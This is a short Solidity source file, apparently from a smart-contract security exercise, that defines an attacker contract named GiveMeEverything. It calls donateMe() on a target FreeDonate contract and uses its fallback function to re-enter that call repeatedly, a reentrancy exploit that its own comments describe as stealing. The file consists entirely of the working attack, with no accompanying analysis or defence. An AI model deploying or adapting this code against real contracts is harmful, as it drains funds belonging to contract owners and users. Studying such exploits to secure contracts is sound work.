pragma solidity ^0.4.0;

import "8.sol";

// I need no ether to attack,

contract GiveMeEverything {
    FreeDonate public fd;
    uint64 public theif_counter;
    
    constructor() payable {
        
    }
    
    function startAttack(address _addr) public {
        fd = FreeDonate(_addr);
        
        theif_counter = 0;
        theif_counter++;
        
        fd.donateMe();
        
    }
    
    function() public payable {
        
        // tries to steal a limited times to that the attack is successful (does not drain the resources)
        
        if (theif_counter < 8) {
            theif_counter++;
            fd.donateMe();
        }
        
        
    }
    
}